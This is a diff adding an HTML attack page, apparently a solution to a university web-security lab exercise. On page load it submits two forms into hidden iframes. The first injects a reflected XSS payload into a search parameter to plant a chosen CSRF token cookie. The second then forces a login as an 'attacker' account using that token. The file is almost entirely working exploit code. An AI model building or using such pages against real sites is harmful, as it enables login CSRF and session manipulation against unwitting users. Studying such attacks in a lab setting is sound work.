@@ -1,0 +1,32 @@
+<html>
+<iframe style='display:none' name='frame1'></iframe>
+<iframe style='display:none' name='csrf-frame'></iframe>
+
+<form name="setup_form" id='searchform' action="http://trurl.cs.illinois.edu" method="get" target='frame1'>
+	<input type='hidden' name='q' value="'><script>document.cookie='csrf_token=test_token';</script>">
+</form>
+
+<form name="loginForm" id="login" action="http://trurl.cs.illinois.edu/login?csrfdefense=1&xssdefense=0" method="post" target='csrf-frame'>
+    <input type='hidden' name="username" value="attacker">
+    <input type='hidden' name="password" value="l33th4x">
+    <input type='hidden' id = 'csrf_token' name='csrf_token' value='test_token'>
+</form>
+
+<script>
+	var cookie;
+
+	// function getCookie(name) {
+	// 	var val = "; " + document.cookie;
+	// 	var split_val = val.split("; " + name + "=");
+	// 	if (split_val.length == 2) return parts.pop().split(";").shift();
+	// 	return 'no cookie'
+	// 	}
+
+	var myform = document.getElementById('login');
+	var search_form = document.getElementById('searchform');
+
+	search_form.submit();
+
+	myform.submit();
+</script>
+</html>
